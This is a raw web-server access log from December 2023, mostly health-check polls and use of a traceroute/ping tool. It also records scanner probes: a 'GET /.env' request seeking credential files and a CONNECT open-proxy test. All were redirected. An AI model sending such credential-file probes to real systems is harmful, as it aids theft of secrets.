167.71.120.76 - - [16/Dec/2023:02:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 633 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 634 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 635 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 636 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 637 "www@docker" "http://172.29.0.8:80" 1ms
35.240.121.17 - - [16/Dec/2023:02:35:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 638 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:02:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 639 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 640 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 641 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 642 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:02:37:22 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 643 "livetrace@docker" "http://172.29.0.3:80" 7ms
159.203.109.206 - - [16/Dec/2023:02:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 644 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:02:37:22 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 645 "livetrace@docker" "http://172.29.0.3:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 646 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 647 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 648 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 649 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 650 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 651 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 652 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 653 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 654 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 655 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 656 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 657 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 658 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 659 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 660 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 661 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 662 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 663 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 664 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 665 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 666 "www@docker" "http://172.29.0.8:80" 1ms
90.151.171.106 - - [16/Dec/2023:02:47:38 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 667 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [16/Dec/2023:02:47:48 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 668 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:02:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 669 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 670 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 671 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 672 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 673 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 674 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 675 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 676 "www@docker" "http://172.29.0.8:80" 1ms
95.214.235.169 - - [16/Dec/2023:02:51:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 677 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [16/Dec/2023:02:51:51 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 678 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:02:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 679 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 680 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 681 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 682 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 683 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 684 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 685 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 686 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 687 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 688 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 689 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 690 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 691 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 692 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 693 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 694 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 695 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 696 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 697 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 698 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 699 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 700 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 701 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 702 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:03:03:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 703 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:03:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 704 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 705 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:03:05:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 706 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:03:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 707 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 708 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 709 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 710 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 711 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 712 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 713 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 714 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 715 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 716 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 717 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 718 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 719 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 720 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 721 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 722 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 723 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 724 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 725 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 726 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 727 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 728 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 729 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 730 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 731 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 732 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 733 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 734 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 735 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 736 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 737 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 738 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 739 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 740 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 741 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 742 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 743 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 744 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 745 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 746 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 747 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 748 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 749 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 750 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 751 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 752 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 753 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 754 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 755 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 756 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 757 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 758 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 759 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 760 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 761 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 762 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 763 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 764 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 765 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 766 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 767 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 768 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 769 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 770 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 771 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 772 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 773 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 774 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 775 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 776 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 777 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 778 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 779 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 780 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 781 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 782 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 783 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 784 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 785 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 786 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 787 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 788 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:03:46:03 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 789 "livetrace@docker" "http://172.29.0.3:80" 5ms
173.48.140.140 - - [16/Dec/2023:03:46:04 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 790 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:11 +0000] "GET /trace/starttrace.php?id=opcd0c8c7 HTTP/2.0" 200 106 "-" "-" 792 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:03:46:11 +0000] "GET /trace/startping.php?id=ihdnz5qas HTTP/2.0" 200 105 "-" "-" 791 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:03:46:12 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 89 "-" "-" 793 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:12 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 80 "-" "-" 794 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:13 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 80 "-" "-" 795 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:13 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 90 "-" "-" 796 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:14 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 91 "-" "-" 797 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:14 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 80 "-" "-" 798 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:15 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 80 "-" "-" 799 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:15 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 90 "-" "-" 800 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:16 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 80 "-" "-" 801 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:16 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 91 "-" "-" 802 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:17 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 90 "-" "-" 804 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:17 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 690 "-" "-" 803 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:18 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 91 "-" "-" 806 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:18 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 690 "-" "-" 805 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:19 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 690 "-" "-" 807 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:19 +0000] "GET /trace/pollping.php?id=ihdnz5qas HTTP/2.0" 200 99 "-" "-" 808 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:19 +0000] "GET /trace/cleanping.php?id=ihdnz5qas HTTP/2.0" 200 71 "-" "-" 809 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:03:46:20 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 713 "-" "-" 810 "livetrace@docker" "http://172.29.0.3:80" 1ms
